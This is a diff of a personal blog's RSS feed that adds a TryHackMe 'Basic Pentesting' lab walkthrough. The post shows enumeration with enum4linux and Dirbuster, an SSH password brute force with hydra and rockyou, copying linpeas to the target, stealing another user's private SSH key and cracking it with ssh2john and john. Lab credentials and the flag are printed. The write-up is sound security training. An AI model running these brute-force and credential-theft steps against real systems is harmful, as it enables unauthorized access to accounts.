@@ -6,8 +6,266 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 31 Aug 2022 17:54:28 -0500</lastBuildDate>
+        <lastBuildDate>Sat, 17 Sep 2022 18:46:19 -0500</lastBuildDate>
         <atom:link href="https://jb-williams.github.io/jbtech.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM_Basic_PenTest_Walkthrough</title>
+            <link>https://jb-williams.github.io/jbtech.github.io/posts/2022/09/thm_basic_pentest_walkthrough/</link>
+            <pubDate>Sat, 17 Sep 2022 18:46:19 -0500</pubDate>
+            
+            <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/09/thm_basic_pentest_walkthrough/</guid>
+            <description>Basic PenTesting Box Performed by Jb Williams facilitated by TryHackMe
+Summary   Hidden directory on webserver(development, found via dirbuster&amp;amp;rockyou).
+  Username (jan and kay found via enum4linux).
+  Password(jan:armando found via hydra with ssh).
+  Private SSH Key found with Linpeas.
+  Cracked SSH Key
+  Was able to login and read pass.bak
+     User Pass Service SSH Key IP Port     jan armando ssh &amp;mdash;&amp;mdash;&amp;mdash;- 10.</description>
+            <content type="html"><![CDATA[<h1 id="basic-pentesting-box">Basic PenTesting Box</h1>
+<p>Performed by Jb Williams facilitated by TryHackMe</p>
+<h2 id="summary">Summary</h2>
+<ul>
+<li>
+<p>Hidden directory on webserver(<code>development</code>, found via dirbuster&amp;rockyou).</p>
+</li>
+<li>
+<p>Username (<code>jan</code> and <code>kay</code> found via enum4linux).</p>
+</li>
+<li>
+<p>Password(<code>jan:armando</code> found via hydra with ssh).</p>
+</li>
+<li>
+<p>Private SSH Key found with Linpeas.</p>
+</li>
+<li>
+<p>Cracked SSH Key</p>
+</li>
+<li>
+<p>Was able to login and read <code>pass.bak</code></p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Pass</th>
+<th>Service</th>
+<th>SSH Key</th>
+<th>IP</th>
+<th>Port</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jan</td>
+<td>armando</td>
+<td>ssh</td>
+<td>&mdash;&mdash;&mdash;-</td>
+<td>10.10.62.206</td>
+<td>22</td>
+</tr>
+<tr>
+<td>kay</td>
+<td>beeswax</td>
+<td>ssh</td>
+<td>kay_id_rsa</td>
+<td>10.10.62.206</td>
+<td>22</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Ports</th>
+<th>Services</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH 7.2</td>
+</tr>
+<tr>
+<td>80</td>
+<td>Apache 2.4.18</td>
+</tr>
+<tr>
+<td>139</td>
+<td>SMB 3.X -4.X</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB 4.3.11</td>
+</tr>
+<tr>
+<td>8009</td>
+<td>Apache Jserv 1.3</td>
+</tr>
+<tr>
+<td>8080</td>
+<td>Apache tomcat 9.0.7</td>
+</tr>
+</tbody>
+</table>
+<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
+<ul>
+<li>Scanned Machine on the network:</li>
+</ul>
+<p><strong>IP:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.62.206
+</code></pre></div><ul>
+<li>Discovered these ports and services running on the device.</li>
+</ul>
+<p><strong>Ports:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">22</span> - ssh 7.2
+<span style="color:#ae81ff">80</span> - apache 2.4.18
+<span style="color:#ae81ff">139</span> - SMB 3.X - 4.X
+<span style="color:#ae81ff">445</span> - SMB 4.3.11
+8009- Apache Jserv 1.3
+<span style="color:#ae81ff">8080</span> Apache tomcat 9.0.7
+</code></pre></div><ul>
+<li>
+<p>Began enumeration on the webpage on port <code>80</code> with Dirbuster:</p>
+</li>
+<li>
+<p>Discovered:</p>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/development/*
+
+/development/dev.txt
+
+/development/j.txt
+</code></pre></div><ul>
+<li>
+<p><code>/development/dev.txt</code> talks about <code>Apache Struts 2.5.12</code>, as well as initials of what I assume are employees:</p>
+<ul>
+<li>Found initials: <code>-K</code> and <code>-J</code></li>
+</ul>
+</li>
+<li>
+<p>In <code>/development/j.txt</code>, found a message that was from <code>K</code> is telling <code>J</code> that they have a weak password that can be cracked easily.</p>
+</li>
+</ul>
+<h2 id="brute-forcing">Brute Forcing</h2>
+<ul>
+<li>Ran enum4linux on the target IP, splitting the output to STDOUT and a file:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">enum4linux -a 10.10.62.206 | tee -a enum4linux.log
+</code></pre></div><ul>
+<li>
+<p>Enum4linux found the full usernames <code>kay</code> and <code>jan</code>:</p>
+</li>
+<li>
+<p>Bruteforced ssh to find <code>jan</code>&rsquo;s password:</p>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -l jan -P /usr/share/wordlist/rockyou.txt ssh://10.10.62.206
+</code></pre></div><ul>
+<li>Credentials that were Found:</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Pass</th>
+<th>Service</th>
+<th>IP</th>
+<th>Port</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jan</td>
+<td>armando</td>
+<td>ssh</td>
+<td>10.10.62.206</td>
+<td>22</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Verified login credentials.</li>
+</ul>
+<h2 id="internal-enumeration">Internal Enumeration</h2>
+<ul>
+<li>
+<p>Logged into <code>jan</code>&rsquo;s  account through ssh.</p>
+</li>
+<li>
+<p>I was able to move traverse over to <code>/home/kay</code>, and say there was a <code>pass.bak</code> file</p>
+</li>
+<li>
+<p>However, I was unable to read anything in <code>/home/kay</code>.</p>
+</li>
+<li>
+<p>From my host, I used ssh to transfer Linpeas to the Machine into the shared memory:</p>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">scp /opt/linpeas/linpeas.sh jan@10.10.62:/dev/shm
+
+ssh jan@10.10.62.206
+
+chmod +x linpeas.sh <span style="color:#f92672">&amp;&amp;</span> ./linpeas.sh | tee linlog.txt
+</code></pre></div><ul>
+<li>This enumeration brought me to <code>kay</code>&rsquo;s Private SSH key that I was able to read.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/home/kay/.ssh/id_rsa
+</code></pre></div><ul>
+<li>I copied to my host and changed the permissions on it.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> kay_id_rsa
+</code></pre></div><ul>
+<li>Discovered the SSH Key was password protected, so I sent it to <code>ssh2john</code>, out put it into a text doc to then run <code>john</code> on it.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 /usr/share/john/ssh2john.py kay_id_rsa &gt; forjohn.txt
+
+john forjohn.txt
+</code></pre></div><ul>
+<li>
+<p>John found <code>kay</code>&rsquo;s password: <code>beeswax</code></p>
+</li>
+<li>
+<p>SSH&rsquo;d into the machine as <code>kay</code>:</p>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i kay_id_rsa kay@10.10.62.206
+beeswax
+</code></pre></div><table>
+<thead>
+<tr>
+<th>User</th>
+<th>Pass</th>
+<th>Service</th>
+<th>SSH Key</th>
+<th>IP</th>
+<th>Port</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>kay</td>
+<td>beeswax</td>
+<td>ssh</td>
+<td>kay_id_rsa</td>
+<td>10.10.62.206</td>
+<td>22</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>As <code>kay</code> I was able to read that <code>pass.bak</code> file:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat pass.bak
+</code></pre></div><ul>
+<li>With that I was able to find the Password/Last Flag:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+</code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>GPG</title>
